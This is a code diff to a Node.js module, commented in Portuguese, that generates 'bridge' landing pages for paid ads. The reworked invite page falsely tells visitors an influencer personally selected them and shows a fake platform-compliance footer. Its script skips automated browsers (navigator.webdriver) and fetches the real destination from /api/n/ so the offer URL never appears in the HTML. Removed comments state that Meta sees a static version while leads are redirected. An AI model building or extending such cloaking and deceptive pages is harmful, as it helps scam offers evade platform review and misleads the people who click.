@@ -4,7 +4,6 @@
  */
 
 const { composePageData, uniquePackId, pickRandomTheme, pickBrandForTheme } = require('./stealthPageVariations');
-const { resolveBridgeVariant, buildBridgeTimerScript, fillTemplate, generateBridgeFingerprint } = require('./bridgePageVariations');
 
 function formatPackStamp(d = new Date()) {
   return d.toLocaleString('pt-BR', {
@@ -431,182 +430,83 @@ function buildInviteBridgeHtml(opts = {}) {
   const navPath = String(opts.navPath || '').trim();
   const withTimer = !!opts.withTimer && !!navPath;
   const year = new Date().getFullYear();
-  const variant = resolveBridgeVariant(opts.bridgeSeed || opts.seed || name + timerSec);
-  const p = variant.prefix;
-  const ids = variant.ids;
-  const iv = variant.invite;
   const initials = name.replace(/[^A-Za-z0-9À-ÿ]/g, ' ').trim().split(/\s+/).slice(0, 2).map((w) => w[0] || '').join('').toUpperCase() || '?';
   const photoAttr = photo ? esc(photo) : '';
   const bannerAttr = banner ? esc(banner) : '';
 
-  const timerScript = buildBridgeTimerScript({
-    navPath,
-    timerSec,
-    barId: ids.bar,
-    labelId: ids.status,
-    ctaId: ids.cta,
-    jsVars: variant.jsVars,
-    withTimer,
-    messages: {
-      tick: iv.tick,
-      done: iv.done,
-      fallback: iv.static,
-      ctaWait: iv.ctaWait,
-      ctaDone: iv.done
-    }
-  });
+  // Sem URL de oferta no HTML. Sem fallback para oferta. Só /api/n/ decide.
+  const timerScript = withTimer
+    ? `<script>(function(){try{if(navigator.webdriver)return;var total=${timerSec}*1000,nav=${JSON.stringify(navPath)},start=Date.now(),bar=document.getElementById('inv-bar'),lab=document.getElementById('inv-timer'),btn=document.getElementById('inv-btn'),done=false,tries=0;function apply(d){if(!d||done)return;if(d.inline&&d.html){done=true;try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next){done=true;try{location.replace(d.next)}catch(e2){location.href=d.next}}}function pull(){tries++;var q=location.search||'';fetch(nav+q,{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json'},body:'{}'}).then(function(r){return r.ok?r.json():null}).then(function(d){if(d)apply(d);else if(tries<3)setTimeout(pull,400);else if(lab)lab.textContent='Convite reservado. Aguarde.'}).catch(function(){if(tries<3)setTimeout(pull,400)})}function tick(){var left=Math.max(0,total-(Date.now()-start)),s=Math.ceil(left/1000),pct=Math.min(100,((total-left)/total)*100);if(bar)bar.style.width=pct+'%';if(lab)lab.innerHTML=s>0?('Preparando seu <strong>acesso exclusivo</strong> em '+s+'s…'):'Abrindo seu acesso agora…';if(btn)btn.textContent=s>0?'Preparando seu acesso…':'Abrindo…';if(left<=0){pull();return}requestAnimationFrame(tick)}requestAnimationFrame(tick)}catch(e){}})();</script>`
+    : '';
 
   const styles = `
     *{box-sizing:border-box;margin:0;padding:0}
-    body{font-family:${variant.font};background:${variant.bg};color:#111827;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:22px 16px;-webkit-font-smoothing:antialiased}
-    .${p}-panel{width:100%;max-width:${380 + (variant.maxW % 40)}px;background:#fff;border-radius:${variant.radius}px;overflow:hidden;box-shadow:0 ${14 + (variant.staticPct % 6)}px ${40 + (variant.staticPct % 20)}px rgba(17,24,39,.${10 + (variant.staticPct % 4)});border:1px solid rgba(15,23,42,.06)}
-    .${p}-cover{height:${148 + (variant.staticPct % 24)}px;background:linear-gradient(135deg,${variant.accent.main} 0%,#1e1b4b 48%,${variant.accent.light} 100%);position:relative;overflow:hidden}
-    .${p}-cover-img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:block;opacity:.55}
-    .${p}-cover-mask{position:absolute;inset:0;background:linear-gradient(180deg,rgba(30,27,75,.2),rgba(30,27,75,.82));pointer-events:none}
-    .${p}-profile{position:absolute;left:50%;bottom:-28px;transform:translateX(-50%);z-index:2;text-align:center;width:calc(100% - 32px)}
-    .${p}-avatar{width:56px;height:56px;border-radius:50%;border:3px solid #fff;box-shadow:0 4px 14px rgba(0,0,0,.22);margin:0 auto 8px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:16px;color:#fff;background:linear-gradient(145deg,${variant.accent.light},${variant.accent.main});overflow:hidden}
-    .${p}-avatar img{width:100%;height:100%;object-fit:cover;display:block}
-    .${p}-handle{font-size:14px;font-weight:800;color:#fff;letter-spacing:.03em;text-transform:uppercase;line-height:1.2;text-shadow:0 1px 4px rgba(0,0,0,.35)}
-    .${p}-tagline{font-size:11px;color:rgba(255,255,255,.9);margin-top:3px;text-shadow:0 1px 2px rgba(0,0,0,.25)}
-    .${p}-main{padding:42px 22px 20px}
-    .${p}-chip{display:inline-flex;align-items:center;gap:5px;font-size:10px;font-weight:700;letter-spacing:.07em;text-transform:uppercase;color:${variant.accent.main};background:${variant.bg};padding:5px 11px;border-radius:999px;margin-bottom:12px}
-    .${p}-chip i{width:5px;height:5px;border-radius:50%;background:${variant.accent.light};display:inline-block}
-    h1{font-size:1.${24 + (variant.staticPct % 8)}rem;font-weight:800;line-height:1.28;letter-spacing:-.02em;color:#111827;margin-bottom:12px}
-    .${p}-main p{font-size:14px;line-height:1.62;color:#4b5563;margin-bottom:11px}
-    .${p}-main p strong{color:#111827;font-weight:700}
-    .${p}-track{height:${4 + (variant.staticPct % 3)}px;background:#e5e7eb;border-radius:99px;overflow:hidden;margin:20px 0 9px}
-    .${p}-track span{display:block;height:100%;width:${withTimer ? (2 + (variant.staticPct % 4)) + '%' : variant.staticPct + '%'};background:linear-gradient(90deg,${variant.accent.main},${variant.accent.light});border-radius:99px;transition:width .14s linear}
-    .${p}-status{text-align:center;font-size:13px;color:#6b7280;margin-bottom:14px;min-height:1.35em}
-    .${p}-cta{display:block;width:100%;border:none;border-radius:${variant.radius - 2}px;padding:13px 16px;background:#374151;color:#fff;font-size:14px;font-weight:700;text-align:center;pointer-events:none;cursor:default;user-select:none}
-    .${p}-skip{display:block;width:100%;margin-top:9px;border:1px solid #e5e7eb;border-radius:${variant.radius - 2}px;padding:11px 16px;background:#fafafa;color:#9ca3af;font-size:13px;font-weight:600;text-align:center;pointer-events:none;cursor:default}
-    .${p}-foot{text-align:center;font-size:11px;color:#9ca3af;padding:2px 22px 18px;line-height:1.45}
+    body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#e8ecf1;color:#0f172a;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px 14px;-webkit-font-smoothing:antialiased}
+    .card{width:100%;max-width:400px;background:#fff;border-radius:18px;overflow:hidden;box-shadow:0 12px 40px rgba(15,23,42,.12)}
+    .hero{height:168px;background:linear-gradient(145deg,#1e293b 0%,#0f172a 55%,#334155 100%);position:relative;overflow:hidden}
+    .hero-bg{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:block}
+    .hero-shade{position:absolute;inset:0;background:linear-gradient(180deg,rgba(15,23,42,.35),rgba(15,23,42,.78));pointer-events:none}
+    .hero-meta{position:absolute;left:16px;right:16px;bottom:14px;display:flex;align-items:center;gap:12px;z-index:2}
+    .avatar{width:52px;height:52px;border-radius:50%;border:2.5px solid #fff;box-shadow:0 2px 10px rgba(0,0,0,.25);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:15px;color:#fff;background:linear-gradient(135deg,#64748b,#334155);overflow:hidden}
+    .avatar img{width:100%;height:100%;object-fit:cover;display:block}
+    .hero-txt{min-width:0}
+    .hero-name{font-size:15px;font-weight:800;color:#fff;letter-spacing:.04em;text-transform:uppercase;line-height:1.2;text-shadow:0 1px 3px rgba(0,0,0,.35)}
+    .hero-sub{font-size:12px;color:rgba(255,255,255,.88);margin-top:2px;text-shadow:0 1px 2px rgba(0,0,0,.3)}
+    .body{padding:22px 22px 18px}
+    .badge{display:inline-flex;align-items:center;gap:6px;font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#2563eb;background:#eff6ff;padding:5px 10px;border-radius:999px;margin-bottom:14px}
+    .badge::before{content:'';width:6px;height:6px;border-radius:50%;background:#2563eb}
+    h1{font-size:1.35rem;font-weight:800;line-height:1.25;letter-spacing:-.02em;color:#0f172a;margin-bottom:14px}
+    .body p{font-size:14px;line-height:1.6;color:#475569;margin-bottom:12px}
+    .body p strong{color:#0f172a;font-weight:700}
+    .progress{height:4px;background:#e2e8f0;border-radius:99px;overflow:hidden;margin:22px 0 10px}
+    .progress>i{display:block;height:100%;width:${withTimer ? '2%' : '100%'};background:#334155;border-radius:99px;transition:width .15s linear}
+    .timer{text-align:center;font-size:13px;color:#64748b;margin-bottom:16px;min-height:1.3em}
+    .btn-main{display:block;width:100%;border:none;border-radius:10px;padding:14px 16px;background:#3f3f46;color:#fff;font-size:15px;font-weight:700;text-align:center;pointer-events:none;cursor:default;user-select:none}
+    .btn-sec{display:block;width:100%;margin-top:10px;border:1px solid #e2e8f0;border-radius:10px;padding:12px 16px;background:#fff;color:#94a3b8;font-size:14px;font-weight:600;text-align:center;text-decoration:none;pointer-events:none;cursor:default}
+    .foot{text-align:center;font-size:11px;color:#94a3b8;padding:4px 22px 18px;line-height:1.45}
   `;
 
   const staticTimerLabel = withTimer
-    ? fillTemplate(iv.tick, timerSec)
-    : iv.static;
+    ? `Preparando seu <strong>acesso exclusivo</strong> em ${timerSec}s…`
+    : 'Seu convite está ativo. Aguarde a confirmação da equipe.';
 
   const bannerImg = bannerAttr
-    ? `<img class="${p}-cover-img" src="${bannerAttr}" alt="" decoding="async" referrerpolicy="no-referrer" onerror="this.style.display='none'">`
+    ? `<img class="hero-bg" src="${bannerAttr}" alt="" decoding="async" referrerpolicy="no-referrer" onerror="this.style.display='none'">`
     : '';
   const avatarInner = photoAttr
     ? `<img src="${photoAttr}" alt="${nameEsc}" decoding="async" referrerpolicy="no-referrer" onerror="this.remove();this.parentNode.textContent='${esc(initials)}'">`
     : esc(initials);
 
   const body = `
-  <div class="${p}-panel">
-    <div class="${p}-cover">
+  <div class="card">
+    <div class="hero">
       ${bannerImg}
-      <div class="${p}-cover-mask"></div>
-      <div class="${p}-profile">
-        <div class="${p}-avatar" aria-hidden="true">${avatarInner}</div>
-        <div class="${p}-handle">${nameEsc}</div>
-        <div class="${p}-tagline">${esc(iv.tagline)}</div>
+      <div class="hero-shade"></div>
+      <div class="hero-meta">
+        <div class="avatar" aria-hidden="true">${avatarInner}</div>
+        <div class="hero-txt">
+          <div class="hero-name">${nameEsc}</div>
+          <div class="hero-sub">Convite exclusivo para você</div>
+        </div>
       </div>
     </div>
-    <div class="${p}-main">
-      <div class="${p}-chip"><i aria-hidden="true"></i> ${esc(iv.chip)}</div>
-      <h1>${esc(iv.headline)}</h1>
-      <p><strong>${nameEsc}</strong> ${esc(iv.body)}</p>
-      <p>${esc(iv.validating)}</p>
-      <div class="${p}-track" aria-hidden="true"><span id="${ids.bar}"></span></div>
-      <div class="${p}-status" id="${ids.status}">${staticTimerLabel}</div>
-      <div class="${p}-cta" id="${ids.cta}">${withTimer ? esc(iv.ctaWait) : esc(iv.ctaIdle)}</div>
-      <div class="${p}-skip">${esc(iv.skip)}</div>
+    <div class="body">
+      <div class="badge">Convite pessoal</div>
+      <h1>Você foi selecionado para esta oportunidade</h1>
+      <p>O influenciador <strong>${nameEsc}</strong> selecionou você para participar de uma ação exclusiva. Poucas pessoas recebem este acesso — a participação é voluntária e você pode encerrar a qualquer momento.</p>
+      <p>Estamos preparando o ambiente oficial da oportunidade. Em instantes você entra com o mesmo privilégio de quem foi escolhido.</p>
+      <div class="progress" aria-hidden="true"><i id="inv-bar"></i></div>
+      <div class="timer" id="inv-timer">${staticTimerLabel}</div>
+      <div class="btn-main" id="inv-btn">${withTimer ? 'Preparando seu acesso…' : 'Convite reservado'}</div>
+      <div class="btn-sec">Não, obrigado</div>
     </div>
-    <div class="${p}-foot">Conteúdo patrocinado · ${year}</div>
+    <div class="foot">Ação veiculada em conformidade com as diretrizes da plataforma parceira. © ${year}</div>
   </div>${timerScript}`;
 
-  return wrapHtml(`${name} · Acesso reservado`, body, styles, {
-    description: `${name} liberou um acesso para você.`,
-    ogTitle: `Acesso · ${name}`,
+  return wrapHtml(`${name} · Convite exclusivo`, body, styles, {
+    description: `${name} selecionou você para uma oportunidade exclusiva.`,
+    ogTitle: `Convite exclusivo · ${name}`,
     ogImage: photo || banner || ''
-  });
-}
-
-/**
- * Ponte neutra — skeleton + "Carregando conteúdo…"
- * Meta vê versão estática; lead usa timer → POST /api/n/ (sem URL da oferta no HTML).
- */
-function buildLoadingBridgeHtml(opts = {}) {
-  const timerSec = Math.max(2, Math.min(30, parseInt(opts.timerSeconds, 10) || 3));
-  const navPath = String(opts.navPath || '').trim();
-  const withTimer = !!opts.withTimer && !!navPath;
-  const year = new Date().getFullYear();
-  const variant = resolveBridgeVariant(opts.bridgeSeed || opts.seed || 'loading-' + timerSec);
-  const p = variant.prefix;
-  const ids = variant.ids;
-  const ld = variant.loading;
-  const barTop = variant.barPos === 'top';
-
-  const timerScript = buildBridgeTimerScript({
-    navPath,
-    timerSec,
-    barId: ids.bar,
-    labelId: ids.status,
-    ctaId: null,
-    jsVars: variant.jsVars,
-    withTimer,
-    messages: {
-      tick: ld.tick,
-      done: ld.done,
-      fallback: ld.fallback
-    }
-  });
-
-  const barBlock = barTop
-    ? `<div class="${p}-bar" aria-hidden="true"><i id="${ids.bar}"></i></div>`
-    : '';
-  const barBlockBottom = !barTop
-    ? `<div class="${p}-bar ${p}-bar-b" aria-hidden="true"><i id="${ids.bar}"></i></div>`
-    : '';
-
-  const styles = `
-    *{box-sizing:border-box;margin:0;padding:0}
-    body{font-family:${variant.font};background:${variant.bg};color:#1e293b;min-height:100vh;-webkit-font-smoothing:antialiased}
-    .${p}-bar{height:${3 + (variant.staticPct % 3)}px;background:#e2e8f0;position:sticky;top:0;z-index:2}
-    .${p}-bar-b{position:fixed;bottom:0;left:0;right:0;top:auto}
-    .${p}-bar i{display:block;height:100%;width:${withTimer ? (3 + (variant.staticPct % 5)) + '%' : variant.staticPct + '%'};background:linear-gradient(90deg,${variant.accent.main},${variant.accent.light});border-radius:0 2px 2px 0;transition:width .12s linear}
-    .${p}-wrap{max-width:${variant.maxW}px;margin:0 auto;padding:${24 + (variant.staticPct % 8)}px 20px ${40 + (variant.staticPct % 12)}px}
-    .${p}-head{display:flex;align-items:center;gap:12px;margin-bottom:${24 + (variant.staticPct % 8)}px}
-    .${p}-logo{width:${34 + (variant.staticPct % 6)}px;height:${34 + (variant.staticPct % 6)}px;border-radius:${8 + (variant.staticPct % 4)}px;background:linear-gradient(135deg,#cbd5e1,${variant.accent.light});flex-shrink:0}
-    .${p}-head-lines{flex:1;min-width:0}
-    .${p}-sk{display:block;border-radius:6px;background:linear-gradient(90deg,#e2e8f0 0%,#f1f5f9 45%,#e2e8f0 90%);background-size:200% 100%;animation:${variant.animName} 1.${3 + (variant.staticPct % 3)}s ease-in-out infinite}
-    @keyframes ${variant.animName}{0%{background-position:100% 0}100%{background-position:-100% 0}}
-    .${p}-sk-h{height:${12 + (variant.staticPct % 4)}px;width:${38 + (variant.staticPct % 12)}%;margin-bottom:8px}
-    .${p}-sk-s{height:10px;width:${24 + (variant.staticPct % 10)}%}
-    .${p}-hero{height:${180 + (variant.staticPct % 40)}px;border-radius:${variant.radius}px;margin-bottom:${20 + (variant.staticPct % 8)}px}
-    .${p}-line{height:12px;margin-bottom:12px}
-    .${p}-w90{width:90%}.${p}-w75{width:75%}.${p}-w60{width:60%}.${p}-w85{width:85%}.${p}-w70{width:70%}
-    .${p}-status{margin-top:${28 + (variant.staticPct % 8)}px;text-align:center;font-size:14px;color:#64748b;min-height:1.4em}
-    .${p}-foot{margin-top:${36 + (variant.staticPct % 10)}px;text-align:center;font-size:11px;color:#94a3b8}
-  `;
-
-  const statusText = withTimer ? fillTemplate(ld.tick, timerSec) : ld.idle;
-  const lineOrder = variant.staticPct % 2 === 0
-    ? ['w90', 'w75', 'w85', 'w60']
-    : ['w85', 'w90', 'w70', 'w75'];
-
-  const body = `
-  ${barBlock}
-  <div class="${p}-wrap">
-    <div class="${p}-head">
-      <div class="${p}-logo" aria-hidden="true"></div>
-      <div class="${p}-head-lines">
-        <span class="${p}-sk ${p}-sk-h" aria-hidden="true"></span>
-        <span class="${p}-sk ${p}-sk-s" aria-hidden="true"></span>
-      </div>
-    </div>
-    <div class="${p}-sk ${p}-hero" aria-hidden="true"></div>
-    ${lineOrder.map((w) => `<span class="${p}-sk ${p}-line ${p}-${w}" aria-hidden="true"></span>`).join('\n    ')}
-    <p class="${p}-status" id="${ids.status}" role="status">${esc(statusText)}</p>
-    <p class="${p}-foot">© ${year}</p>
-  </div>
-  ${barBlockBottom}${timerScript}`;
-
-  return wrapHtml(ld.idle.replace('…', ''), body, styles, {
-    description: ld.idle,
-    ogTitle: ld.idle
   });
 }
 
@@ -616,8 +516,6 @@ module.exports = {
   listStealthThemes,
   resolveThemeKey,
   buildInviteBridgeHtml,
-  buildLoadingBridgeHtml,
-  generateBridgeFingerprint,
   normalizeImageUrl,
   THEMES
 };
